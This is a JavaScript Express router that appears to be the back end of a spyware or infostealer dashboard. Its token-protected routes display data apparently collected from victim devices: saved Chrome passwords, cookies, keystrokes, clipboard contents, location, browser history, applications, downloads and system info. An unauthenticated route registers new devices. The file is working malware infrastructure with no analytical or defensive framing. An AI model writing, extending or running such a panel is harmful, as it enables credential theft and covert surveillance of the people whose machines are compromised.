const express = require("express");
const passport = require("passport");
const router = express.Router();
const authenticateToken = require("../middleware/authMiddleware");
const connection = require("../config/DBConfig");
const path = require("path");
const {
  insertDevice,
  modifyScript,
} = require("../controllers/devicesController");
const {
  getchromepasswords,
  getkeystrokes,
  getclipboard,
  getlocation,
  getbrowserhistory,
  getapplications,
  getrecentdownloads,
  getsysteminfo,
  getdeviceinfo,
  getCookie,
} = require("../controllers/UserData");

/* GET users listing. */
router.get("/", function (req, res, next) {
  res.send("respond with a resource");
});
router.get("/chromepasswords", authenticateToken, function (req, res, next) {
  getchromepasswords((err, chromedata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("chromepasswords", { chromedata });
    }
  });
});

router.get("/Cookie", authenticateToken, function (req, res, next) {
  getCookie((err, Cookiedata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("Cookie", { Cookiedata });
    }
  });
});

router.get("/keystrokes", authenticateToken, function (req, res, next) {
  getkeystrokes((err, keystrokesdata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("keystrokes", { keystrokesdata });
    }
  });
});

router.get("/clipboard", authenticateToken, function (req, res, next) {
  getclipboard((err, clipboarddata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("clipboard", { clipboarddata });
    }
  });
});

router.get("/locationinfo", authenticateToken, function (req, res, next) {
  getlocation((err, locationdata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("locationinfo", { locationdata });
    }
  });
});

router.get("/browserhistory", authenticateToken, function (req, res, next) {
  getbrowserhistory((err, browserhistorydata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("browserhistory", { browserhistorydata });
    }
  });
});

router.get("/applications", authenticateToken, function (req, res, next) {
  getapplications((err, applicationsdata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("applications", { applicationsdata });
    }
  });
});

router.get("/recentdownloads", authenticateToken, function (req, res, next) {
  getrecentdownloads((err, recentdownloadsdata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("recentdownloads", { recentdownloadsdata });
    }
  });
});

router.get("/systeminfo", authenticateToken, function (req, res, next) {
  getsysteminfo((err, systeminfodata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("systeminfo", { systeminfodata });
    }
  });
});
// dashboard
router.get("/dashboard", authenticateToken, function (req, res, next) {
  getdeviceinfo((err, devicedata) => {
    if (err) {
      res.status(500).send("Internal Server Error");
    } else {
      // Render the EJS template and pass the product data to it
      res.render("dashboard", { devicedata });
    }
  });
});
router.post("/insertDevice", insertDevice);
router.get("/settings", function (req, res, next) {
  res.render("settings");
});

module.exports = router;
